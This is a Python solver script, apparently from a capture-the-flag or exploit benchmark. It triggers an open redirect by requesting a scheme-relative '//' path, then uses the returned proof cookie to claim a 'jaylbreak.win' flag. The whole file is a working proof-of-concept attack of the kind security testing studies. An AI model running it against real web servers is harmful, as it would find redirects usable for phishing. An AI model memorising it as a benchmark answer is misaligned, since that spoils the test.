#!/usr/bin/env python3
"""Obtain the flag after a scheme-relative external redirect."""

import http.client
from http.cookies import SimpleCookie
import json
import os
import re
import secrets
import sys
import urllib.parse


def request_redirect(target_url: str, nonce: str) -> str:
    target = urllib.parse.urlsplit(target_url)
    if target.scheme != 'http' or not target.hostname:
        raise RuntimeError('REMOTE_TARGET_URL must be an HTTP target')
    connection = http.client.HTTPConnection(target.hostname, target.port or 80, timeout=20)
    path = f'//{nonce}.redirect-proof.invalid'
    connection.request('GET', path)
    response = connection.getresponse()
    location = response.getheader('Location')
    cookie_header = response.getheader('Set-Cookie')
    response.read()
    connection.close()
    if response.status != 301 or location != path + '/':
        raise RuntimeError('target did not redirect to the external host')
    cookies = SimpleCookie()
    cookies.load(cookie_header or '')
    if 'redirect_proof' not in cookies:
        raise RuntimeError('target did not issue redirect proof')
    return cookies['redirect_proof'].value


def claim_flag(target_url: str, nonce: str, proof: str) -> str:
    target = urllib.parse.urlsplit(target_url)
    connection = http.client.HTTPConnection(target.hostname, target.port or 80, timeout=20)
    connection.request(
        'GET',
        f'/claim/?{urllib.parse.urlencode({"nonce": nonce})}',
        headers={'Cookie': f'redirect_proof={proof}'},
    )
    response = connection.getresponse()
    body = response.read().decode('utf-8', errors='replace').strip()
    connection.close()
    if response.status != 200:
        raise RuntimeError(f'flag claim failed with HTTP {response.status}')
    if not re.fullmatch(r'jaylbreak\.win\{[^}]+\}', body):
        raise RuntimeError('flag claim returned no valid flag')
    return body


def main() -> None:
    target_url = os.environ['REMOTE_TARGET_URL']
    nonce = secrets.token_hex(16)
    proof = request_redirect(target_url, nonce)
    flag = claim_flag(target_url, nonce, proof)
    print(json.dumps({'evidence_payload': {'flag': flag}}))


if __name__ == '__main__':
    try:
        main()
    except (RuntimeError, OSError) as error:
        print(str(error), file=sys.stderr)
        raise SystemExit(1)
